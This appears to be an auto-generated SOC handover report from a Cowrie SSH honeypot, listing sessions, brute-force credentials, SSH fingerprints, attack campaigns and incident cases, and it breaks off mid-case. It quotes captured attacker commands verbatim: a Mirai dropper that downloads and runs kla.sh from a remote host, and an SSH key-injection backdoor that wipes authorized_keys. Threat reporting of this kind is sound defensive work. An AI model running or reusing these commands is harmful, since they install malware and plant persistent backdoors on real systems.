# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-18 |
| **Generated At** | 2026-11-18T05:02:00Z |
| **Shift Time** | 05:02 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **188** |
| Confirmed Threats | **152** |
| False Positives Filtered | **36** (19.1%) |
| Unique Attacker IPs | **134** |
| Countries of Origin | **38** |
| High Severity Cases | **110** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **78** |
| Malware Samples Analyzed | **9** HIGH · **26** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **297** |
| Unique Credential Pairs | **171** |
| Unique Usernames | **65** |
| Unique Passwords | **147** |
| Successful Auth Pairs | **236** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 124 |
| `admin` | 20 |
| `rootssssss23424123123` | 15 |
| `supervisor` | 15 |
| `support` | 10 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `rootssssss23424123123` | 15 |
| `root3245gs5662d34111111111` | 15 |
| `` | 14 |
| `admin` | 10 |
| `support` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 15 |
| `root` | `root3245gs5662d34111111111` | 15 |
| `admin` | `` | 10 |
| `support` | `support` | 6 |
| `admin` | `admin` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `adminwifi` | `10.0.0.73` | 2026-11-18T00:00:12 |
| `test2` | `test` | `10.0.0.73` | 2026-11-18T00:12:51 |
| `support` | `support` | `10.0.0.73` | 2026-11-18T00:17:04 |
| `support` | `support` | `176.53.159.196` | 2026-11-18T00:24:16 |
| `root` | `pasword` | `4.206.92.183` | 2026-11-18T00:25:47 |
| `rootssssss23424123123` | `rootssssss23424123123` | `4.206.92.183` | 2026-11-18T00:25:49 |
| `root` | `root3245gs5662d34111111111` | `4.206.92.183` | 2026-11-18T00:25:51 |
| `root` | `65432!` | `103.43.191.43` | 2026-11-18T00:26:41 |
| `rootssssss23424123123` | `rootssssss23424123123` | `103.43.191.43` | 2026-11-18T00:26:45 |
| `root` | `root3245gs5662d34111111111` | `103.43.191.43` | 2026-11-18T00:26:48 |
| `root` | `Guest` | `43.157.200.91` | 2026-11-18T00:26:57 |
| `rootssssss23424123123` | `rootssssss23424123123` | `43.157.200.91` | 2026-11-18T00:27:02 |
| `root` | `root3245gs5662d34111111111` | `43.157.200.91` | 2026-11-18T00:27:05 |
| `pi` | `starfish` | `121.167.171.219` | 2026-11-18T00:32:01 |
| `pi` | `starfish` | `95.7.10.127` | 2026-11-18T00:32:09 |
| `root` | `1qaz@wsx` | `84.243.8.197` | 2026-11-18T00:36:18 |
| `root` | `1qaz@wsx` | `70.167.235.189` | 2026-11-18T00:36:25 |
| `supervisor` | `5555555` | `114.32.19.171` | 2026-11-18T00:40:28 |
| `supervisor` | `5555555` | `196.188.93.169` | 2026-11-18T00:40:37 |
| `supervisor` | `asdfgh` | `49.124.151.71` | 2026-11-18T00:41:01 |
_… 216 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **188** |
| Sessions with Fingerprint | **26** |
| Unique HASSH Fingerprints | **26** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 47 |
| Go SSH scanner | 43 |
| libssh | 23 |
| PuTTY | 3 |
| Unknown | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 46 | 46 |
| `f555226df196...` | Mirai/variant | 18 | 9 |
| `2ec37a7cc8da...` | Mirai/variant | 17 | 2 |
| `7d01d047ace6...` | Mirai/variant | 6 | 3 |
| `16443846184e...` | Generic scanner | 4 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 46 | 46 | Mirai/variant |
| `f555226df196...` | libssh | 18 | 9 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 17 | 2 | Mirai/variant |
| `7d01d047ace6...` | Go SSH scanner | 6 | 3 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 4 | 3 | Generic scanner |
| `f1e5e9d24e5e...` | Go SSH scanner | 3 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `5bd26477da54...` | PuTTY | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **24** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 17 | 10 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
linuxshell
```
```
system
```
```
sh
```
```
ls /home; /bin/busybox BOTNET
```
Source IPs: `160.119.66.206`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `14.103.123.67`, `43.157.200.91`, `50.6.241.208`, `152.32.218.149`, `143.110.145.158`, `4.206.92.183`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
cd /tmp 2>/dev/null || cd /var 2>/dev/null || cd /dev/shm 2>/dev/null || cd /run 2>/dev/null || cd /root 2>/dev/null || cd /;rm -f kla.sh;wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||busybox wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||curl -sLo kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet&
```
Source IPs: `160.119.66.206`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **134** |
| Unique ASNs | **59** |
| High-Risk ASNs | **46** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 54 | HIGH |
| `AS15169` | Google LLC | 6 | HIGH |
| `AS4766` | Korea Telecom | 6 | HIGH |
| `AS396982` | Google LLC | 4 | HIGH |
| `AS22773` | Cox Communications Inc. | 4 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 2 | HIGH |
| `AS25369` | Hydra Communications Ltd | 2 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (100)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-9fb80f79e723

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-18 00:24 |
| **Last Seen** | 2026-11-18 00:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 00:24:16` | `cowrie.session.connect` |
| `2026-11-18 00:24:16` | `cowrie.client.version` |
| `2026-11-18 00:24:16` | `cowrie.client.kex` |
| `2026-11-18 00:24:16` | `cowrie.login.success` |
| `2026-11-18 00:24:16` | `cowrie.direct-tcpip.request` |
| `2026-11-18 00:24:16` | `cowrie.direct-tcpip.data` |
| `2026-11-18 00:24:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca12e2217bec

| Field | Detail |
|---|---|
| **Source IP** | `4.206.92[.]183` |
| **First Seen** | 2026-11-18 00:25 |
| **Last Seen** | 2026-11-18 00:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 00:25:47` | `cowrie.session.connect` |
| `2026-11-18 00:25:47` | `cowrie.client.version` |
| `2026-11-18 00:25:47` | `cowrie.client.kex` |
| `2026-11-18 00:25:47` | `cowrie.login.success` |
| `2026-11-18 00:25:48` | `cowrie.session.params` |
| `2026-11-18 00:25:48` | `cowrie.command.input` |
| `2026-11-18 00:25:48` | `cowrie.command.failed` |
| `2026-11-18 00:25:48` | `cowrie.log.closed` |
| `2026-11-18 00:25:49` | `cowrie.session.params` |
| `2026-11-18 00:25:49` | `cowrie.command.input` |
| `2026-11-18 00:25:49` | `cowrie.session.file_download` |
| `2026-11-18 00:25:49` | `cowrie.log.closed` |
| `2026-11-18 00:25:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.206.92[.]183` to AbuseIPDB if not already reported
- [ ] Block `4.206.92[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1886380a00a

| Field | Detail |
|---|---|
| **Source IP** | `4.206.92[.]183` |
| **First Seen** | 2026-11-18 00:25 |
| **Last Seen** | 2026-11-18 00:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 00:25:49` | `cowrie.session.connect` |
| `2026-11-18 00:25:49` | `cowrie.client.version` |
| `2026-11-18 00:25:49` | `cowrie.client.kex` |
| `2026-11-18 00:25:49` | `cowrie.login.success` |
| `2026-11-18 00:25:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.206.92[.]183` to AbuseIPDB if not already reported
- [ ] Block `4.206.92[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e62e6ec5657

| Field | Detail |
|---|---|
| **Source IP** | `103.43.191[.]43` |
| **First Seen** | 2026-11-18 00:26 |
| **Last Seen** | 2026-11-18 00:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 00:26:40` | `cowrie.session.connect` |
| `2026-11-18 00:26:40` | `cowrie.client.version` |
| `2026-11-18 00:26:40` | `cowrie.client.kex` |
| `2026-11-18 00:26:41` | `cowrie.login.success` |
| `2026-11-18 00:26:42` | `cowrie.session.params` |
| `2026-11-18 00:26:42` | `cowrie.command.input` |
| `2026-11-18 00:26:42` | `cowrie.command.failed` |
| `2026-11-18 00:26:43` | `cowrie.log.closed` |
| `2026-11-18 00:26:44` | `cowrie.session.params` |
| `2026-11-18 00:26:44` | `cowrie.command.input` |
| `2026-11-18 00:26:44` | `cowrie.session.file_download` |
| `2026-11-18 00:26:44` | `cowrie.log.closed` |
| `2026-11-18 00:26:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.43.191[.]43` to AbuseIPDB if not already reported
- [ ] Block `103.43.191[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccaaf75d17a0

| Field | Detail |
|---|---|
| **Source IP** | `103.43.191[.]43` |
| **First Seen** | 2026-11-18 00:26 |
| **Last Seen** | 2026-11-18 00:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 00:26:44` | `cowrie.session.connect` |
| `2026-11-18 00:26:44` | `cowrie.client.version` |
| `2026-11-18 00:26:44` | `cowrie.client.kex` |
| `2026-11-18 00:26:45` | `cowrie.login.success` |
| `2026-11-18 00:26:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.43.191[.]43` to AbuseIPDB if not already reported
- [ ] Block `103.43.191[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f21d8be2bf43

| Field | Detail |
|---|---|
| **Source IP** | `43.157.200[.]91` |
| **First Seen** | 2026-11-18 00:26 |
| **Last Seen** | 2026-11-18 00:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 00:26:56` | `cowrie.session.connect` |
| `2026-11-18 00:26:56` | `cowrie.client.version` |
| `2026-11-18 00:26:56` | `cowrie.client.kex` |
| `2026-11-18 00:26:57` | `cowrie.login.success` |
| `2026-11-18 00:26:59` | `cowrie.session.params` |
| `2026-11-18 00:26:59` | `cowrie.command.input` |
| `2026-11-18 00:26:59` | `cowrie.command.failed` |
| `2026-11-18 00:26:59` | `cowrie.log.closed` |
| `2026-11-18 00:27:00` | `cowrie.session.params` |
| `2026-11-18 00:27:00` | `cowrie.command.input` |
| `2026-11-18 00:27:00` | `cowrie.session.file_download` |
| `2026-11-18 00:27:00` | `cowrie.log.closed` |
| `2026-11-18 00:27:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.157.200[.]91` to AbuseIPDB if not already reported
- [ ] Block `43.157.200[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-069bb5a310e0

| Field | Detail |
|---|---|
| **Source IP** | `43.157.200[.]91` |
| **First Seen** | 2026-11-18 00:27 |
| **Last Seen** | 2026-11-18 00:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 00:27:00` | `cowrie.session.connect` |
| `2026-11-18 00:27:00` | `cowrie.client.version` |
| `2026-11-18 00:27:01` | `cowrie.client.kex` |
| `2026-11-18 00:27:02` | `cowrie.login.success` |
| `2026-11-18 00:27:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.157.200[.]91` to AbuseIPDB if not already reported
- [ ] Block `43.157.200[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07246d98fa80

| Field | Detail |
|---|---|
| **Source IP** | `84.243.8[.]197` |
| **First Seen** | 2026-11-18 00:36 |
| **Last Seen** | 2026-11-18 00:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 00:36:16` | `cowrie.session.connect` |
| `2026-11-18 00:36:17` | `cowrie.client.version` |
| `2026-11-18 00:36:17` | `cowrie.client.kex` |
| `2026-11-18 00:36:18` | `cowrie.login.success` |
| `2026-11-18 00:36:18` | `cowrie.direct-tcpip.request` |
| `2026-11-18 00:36:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.243.8[.]197` to AbuseIPDB if not already reported
- [ ] Block `84.243.8[.]197` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d08bec04deec

| Field | Detail |
|---|---|
| **Source IP** | `70.167.235[.]189` |
| **First Seen** | 2026-11-18 00:36 |
| **Last Seen** | 2026-11-18 00:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 00:36:23` | `cowrie.session.connect` |
| `2026-11-18 00:36:24` | `cowrie.client.version` |
| `2026-11-18 00:36:24` | `cowrie.client.kex` |
| `2026-11-18 00:36:25` | `cowrie.login.success` |
| `2026-11-18 00:36:26` | `cowrie.direct-tcpip.request` |
| `2026-11-18 00:36:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.167.235[.]189` to AbuseIPDB if not already reported
- [ ] Block `70.167.235[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b0803809ccf

| Field | Detail |
|---|---|
| **Source IP** | `114.32.19[.]171` |
| **First Seen** | 2026-11-18 00:40 |
| **Last Seen** | 2026-11-18 00:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 00:40:25` | `cowrie.session.connect` |
| `2026-11-18 00:40:26` | `cowrie.client.version` |
| `2026-11-18 00:40:26` | `cowrie.client.kex` |
| `2026-11-18 00:40:28` | `cowrie.login.success` |
| `2026-11-18 00:40:29` | `cowrie.direct-tcpip.request` |
| `2026-11-18 00:40:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.32.19[.]171` to AbuseIPDB if not already reported
- [ ] Block `114.32.19[.]171` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71a1d1160df5

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-11-18 00:40 |
| **Last Seen** | 2026-11-18 00:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 00:40:35` | `cowrie.session.connect` |
| `2026-11-18 00:40:35` | `cowrie.client.version` |
| `2026-11-18 00:40:35` | `cowrie.client.kex` |
| `2026-11-18 00:40:37` | `cowrie.login.success` |
| `2026-11-18 00:40:37` | `cowrie.direct-tcpip.request` |
| `2026-11-18 00:40:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-304f2efd12e1

| Field | Detail |
|---|---|
| **Source IP** | `49.124.151[.]71` |
| **First Seen** | 2026-11-18 00:40 |
| **Last Seen** | 2026-11-18 00:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 00:40:58` | `cowrie.session.connect` |
| `2026-11-18 00:40:58` | `cowrie.client.version` |
| `2026-11-18 00:40:58` | `cowrie.client.kex` |
| `2026-11-18 00:41:01` | `cowrie.login.success` |
| `2026-11-18 00:41:02` | `cowrie.direct-tcpip.request` |
| `2026-11-18 00:41:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.151[.]71` to AbuseIPDB if not already reported
- [ ] Block `49.124.151[.]71` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd67bf04cfaa

| Field | Detail |
|---|---|
| **Source IP** | `72.215.33[.]16` |
| **First Seen** | 2026-11-18 00:41 |
| **Last Seen** | 2026-11-18 00:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 00:41:12` | `cowrie.session.connect` |
| `2026-11-18 00:41:12` | `cowrie.client.version` |
| `2026-11-18 00:41:12` | `cowrie.client.kex` |
| `2026-11-18 00:41:14` | `cowrie.login.success` |
| `2026-11-18 00:41:15` | `cowrie.direct-tcpip.request` |
| `2026-11-18 00:41:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.215.33[.]16` to AbuseIPDB if not already reported
- [ ] Block `72.215.33[.]16` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7c2c6ef4e19

| Field | Detail |
|---|---|
| **Source IP** | `81.214.75[.]248` |
| **First Seen** | 2026-11-18 00:53 |
| **Last Seen** | 2026-11-18 00:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 00:53:34` | `cowrie.session.connect` |
| `2026-11-18 00:53:34` | `cowrie.client.version` |
| `2026-11-18 00:53:34` | `cowrie.client.kex` |
| `2026-11-18 00:53:35` | `cowrie.login.success` |
| `2026-11-18 00:53:36` | `cowrie.direct-tcpip.request` |
| `2026-11-18 00:53:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.214.75[.]248` to AbuseIPDB if not already reported
- [ ] Block `81.214.75[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-891d48214e6e

| Field | Detail |
|---|---|
| **Source IP** | `200.192.102[.]98` |
| **First Seen** | 2026-11-18 00:59 |
| **Last Seen** | 2026-11-18 00:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 00:59:14` | `cowrie.session.connect` |
| `2026-11-18 00:59:15` | `cowrie.client.version` |
| `2026-11-18 00:59:15` | `cowrie.client.kex` |
| `2026-11-18 00:59:17` | `cowrie.login.success` |
| `2026-11-18 00:59:18` | `cowrie.direct-tcpip.request` |
| `2026-11-18 00:59:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.192.102[.]98` to AbuseIPDB if not already reported
- [ ] Block `200.192.102[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-886133147124

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]171` |
| **First Seen** | 2026-11-18 01:04 |
| **Last Seen** | 2026-11-18 01:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
